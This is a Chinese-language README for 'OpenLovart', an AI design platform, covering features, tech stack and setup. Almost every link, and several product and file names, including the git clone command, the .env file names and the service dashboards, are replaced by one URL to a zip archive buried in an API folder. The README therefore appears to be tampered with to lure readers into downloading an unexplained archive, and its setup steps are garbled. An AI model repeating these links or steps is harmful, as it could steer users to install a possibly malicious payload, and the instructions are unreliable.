# OpenLovart 🎨

OpenLovart 是一个基于 AI 的设计平台，让创意设计变得简单而强大。通过 AI 对话和智能画布，快速实现你的设计想法。

## ✨ 主要功能

- 🤖 **AI 设计助手** - 通过自然语言对话生成设计方案
- 🎨 **智能画布** - 可视化编辑器，支持拖拽、缩放、旋转等操作
- 🖼️ **AI 图像生成** - 集成 Google Gemini 和 https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip Grok，生成高质量图像
- 💾 **项目管理** - 保存和管理你的设计项目
- 👤 **用户系统** - 基于 Clerk 的安全认证和积分系统
- ☁️ **云端存储** - 使用 Supabase 实现数据持久化

## 🚀 技术栈

- **框架**: https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip 16 (App Router)
- **语言**: TypeScript
- **样式**: Tailwind CSS 4
- **认证**: Clerk
- **数据库**: Supabase (PostgreSQL)
- **AI 服务**: 
  - Google Gemini (图像生成)
  - https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip Grok (设计建议)
- **部署**: Vercel

## 📦 快速开始

### 1. 克隆项目

```bash
git clone https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip
cd OpenLovart
```

### 2. 安装依赖

```bash
npm install
```

### 3. 配置环境变量

复制 `https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip` 为 `https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip` 并填入你的 API 密钥：

```bash
cp https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip
```

编辑 `https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip` 文件：

```env
# Clerk Authentication
NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY=your_clerk_publishable_key
CLERK_SECRET_KEY=your_clerk_secret_key

# Supabase
NEXT_PUBLIC_SUPABASE_URL=your_supabase_project_url
NEXT_PUBLIC_SUPABASE_ANON_KEY=your_supabase_anon_key

# Google Gemini AI
GEMINI_API_KEY=your_gemini_api_key

# https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip Grok API (可选)
XAI_API_KEY=your_xai_api_key
```

### 4. 设置数据库

在 Supabase 中执行 `https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip` 创建必要的表：

```sql
-- 在 Supabase SQL Editor 中运行
-- 文件位置: https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip
```

### 5. 配置 Clerk JWT 模板

参考 `https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip` 文档配置 Clerk 的 Supabase JWT 模板。

### 6. 运行开发服务器

```bash
npm run dev
```

打开 [http://localhost:3000](http://localhost:3000) 查看应用。

## 🔑 获取 API 密钥

### Clerk (认证服务)
1. 访问 [Clerk Dashboard](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)
2. 创建新应用
3. 复制 Publishable Key 和 Secret Key

### Supabase (数据库)
1. 访问 [Supabase Dashboard](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)
2. 创建新项目
3. 在 Settings > API 中找到 URL 和 anon key

### Google Gemini (AI 服务)
1. 访问 [Google AI Studio](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)
2. 创建 API Key

### https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip Grok (可选)
1. 访问 [https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip Console](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)
2. 创建 API Key

## 📁 项目结构

```
OpenLovart/
├── src/
│   ├── app/                    # https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip App Router 页面
│   │   ├── api/               # API 路由
│   │   ├── lovart/            # 主应用页面
│   │   └── debug-*/           # 调试工具
│   ├── components/            # React 组件
│   │   └── lovart/           # 核心组件
│   ├── hooks/                # 自定义 Hooks
│   ├── lib/                  # 工具库
│   └── https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip         # 中间件
├── public/                   # 静态资源
├── https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip      # 数据库架构
└── https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip             # 环境变量模板
```

## 🛠️ 可用命令

```bash
# 开发模式
npm run dev

# 构建生产版本
npm run build

# 运行生产服务器
npm run start

# 代码检查
npm run lint
```

## 📚 文档

- [Clerk JWT 设置](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)
- [Grok 集成指南](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)
- [用户积分功能](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)
- [故障排除](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)

## 🚢 部署到 Vercel

1. 推送代码到 GitHub
2. 在 [Vercel](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip) 导入项目
3. 配置环境变量（与 `https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip` 相同）
4. 部署！

[![Deploy with Vercel](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)

## 🤝 贡献

欢迎提交 Issue 和 Pull Request！

## 📄 许可证

MIT License

## 🙏 致谢

- [https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)
- [Clerk](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)
- [Supabase](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)
- [Google Gemini](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)
- [https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip](https://raw.githubusercontent.com/ftxk000/OpenLovart/master/src/app/api/video-status/Lovart-Open-v2.9.zip)

---

Made with ❤️ by OpenLovart Team
